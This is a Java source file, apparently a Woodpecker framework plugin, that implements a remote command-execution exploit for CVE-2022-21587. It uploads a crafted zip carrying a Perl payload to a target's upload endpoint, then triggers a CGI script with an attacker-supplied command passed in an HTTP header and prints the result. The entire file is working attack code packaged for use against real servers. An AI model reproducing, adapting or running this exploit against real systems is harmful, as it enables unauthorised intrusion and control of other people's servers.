package me.gv7.woodpecker.plugin.exploits;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.requests.Requests;
import me.gv7.woodpecker.requests.body.Part;
import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class CVE_2022_21587_Command_Execution implements IExploit {
    public IResultOutput resultOutput;

    @Override
    public String getExploitTabCaption() {
        return "Command Execution";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        // command
        List<IArg> args = new ArrayList<>();
        final IArg cmd = VulPluginInfo.pluginHelper.createArg();
        cmd.setName("cmd");
        cmd.setDefaultValue("whoami");
        cmd.setDescription("command");
        cmd.setRequired(true);
        cmd.setType(IArg.ARG_TYPE_STRING);
        args.add(cmd);

        IArgsUsageBinder binder = VulPluginInfo.pluginHelper.createArgsUsageBinder();
        binder.setArgsList(args);
        return binder;
    }

    @Override
    public void doExploit(ITarget target, Map<String, Object> customArgs, IResultOutput result) throws Throwable {
        this.resultOutput = result;
        HashMap<String, String> headers = new HashMap<>();
        String rootURL = target.getRootAddress();
        if (rootURL.endsWith("/"))
            rootURL = rootURL.substring(0, rootURL.length() - 1);
        String uploadUrl = rootURL + CommonUtils.UPLOAD_ENDPOINT;
        this.resultOutput.infoPrintln("uploadUrl: " + uploadUrl);
        String cgiUrl = rootURL + CommonUtils.CGI_ENDPOINT;
        String cmd = (String)customArgs.get("cmd");
        String zipName = "tempp.zip";
        String zipSavePath = System.getProperty("java.io.tmpdir") + zipName;
        headers.put("cmd", cmd);


        // txkFNDWRR.pl Execute Commands
        String payload = CommonUtils.generateEvilZip(result, CommonUtils.DEFAULT_PL_PATH, zipName, zipSavePath);
        String res = Requests.post(uploadUrl).multiPartBody(Part.file("uploadfilename", zipName, payload.getBytes())).verify(false).send().readToText();
        this.resultOutput.infoPrintln("upload " + zipName + " finish ");
        if (res.contains("bne:text=\"Cannot be logged in as GUEST.\" bne:cause=\"\" bne:action=\"\" />")){
            String results = Requests.get(cgiUrl).headers(headers).verify(false).send().readToText();
            this.resultOutput.infoPrintln("cmd: " + cmd);
            this.resultOutput.rawPrintln(results);
        } else {
            this.resultOutput.warningPrintln("response body: " + "\n" + res);
        }


    }




}
